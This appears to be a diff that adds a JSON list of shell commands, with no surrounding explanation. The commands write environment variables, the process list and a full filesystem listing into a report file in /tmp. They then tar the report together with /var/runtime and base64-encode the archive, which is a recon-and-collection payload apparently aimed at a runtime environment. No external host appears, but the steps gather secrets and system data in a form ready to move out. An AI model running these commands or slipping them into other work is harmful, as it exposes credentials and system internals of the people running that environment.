@@ -1,0 +1,7 @@
+[
+    "env > /tmp/report.txt",
+    "ps -aux >> /tmp/report.txt",
+    "find / >> /tmp/report.txt",
+    "tar czvf /tmp/runtime.tar.gz /var/runtime /tmp/report.txt",
+    "python -mbase64 -e /tmp/runtime.tar.gz"
+]
